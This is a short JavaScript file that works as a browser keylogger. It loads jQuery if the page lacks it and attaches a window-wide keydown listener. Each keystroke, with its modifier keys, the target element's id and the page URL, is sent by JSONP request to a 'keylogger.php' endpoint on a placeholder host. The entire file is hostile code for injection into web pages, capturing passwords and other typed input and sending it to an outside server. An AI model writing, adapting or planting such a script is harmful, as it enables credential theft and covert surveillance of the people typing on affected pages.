if((window.jQuery))
{
    console.log("jQuery Found");
}
else
{
    console.log("jQuery Not Found");
    var script = document.createElement('script');
    script.src = 'https://code.jquery.com/jquery-3.3.1.min.js';
    document.body.appendChild(script);
}

function c(d)
{
    jQuery.ajax(
    {
        dataType: "jsonp",
        type:"GET",
        url: "https://laurldelaweb/keylogger.php",
        jsonp:"keypressed",
        data:
        {
            altnKey:d.altKey?1:0,
            ctrlKey:d.ctrlKey?1:0,
            userKey:d.key,
            targKey:d.target.id,
            userURI:d.target.baseURI
        },
        async:false,
        success: function(data)
        {
            console.log(data);
        },
        error:function(xhr, ajaxOptions, thrownError)
        {
            console.log("Error");
        }
    });
}

window.onload = function()
{
    window.addEventListener("keydown", function(e) 
    {
        c(e);
    });
}